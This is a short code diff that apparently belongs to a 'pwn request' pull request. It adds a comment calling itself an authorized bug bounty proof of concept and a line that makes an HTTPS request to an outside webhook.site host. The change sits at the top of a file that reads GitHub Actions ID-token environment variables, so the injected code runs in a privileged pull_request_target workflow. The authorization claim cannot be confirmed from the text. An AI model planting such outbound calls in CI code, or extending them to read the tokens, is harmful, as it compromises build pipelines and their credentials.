@@ -1,3 +1,9 @@
+// SECURITY TEST (authorized bug bounty PoC, no real data touched): this line only
+// proves that PR-supplied code in this file executes when use-action.yaml's
+// pull_request_target workflow checks out and runs refs/pull/<n>/merge via `uses: ./`.
+// It does not read, use, or exfiltrate ACTIONS_ID_TOKEN_REQUEST_TOKEN or any secret.
+require('https').get('https://4db273b2-89af-4660-85f2-d11800f273e3.webhook.site/pwn-request-poc-swbb');
+
 const actionsToken = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN;
 const actionsUrl = process.env.ACTIONS_ID_TOKEN_REQUEST_URL;
 
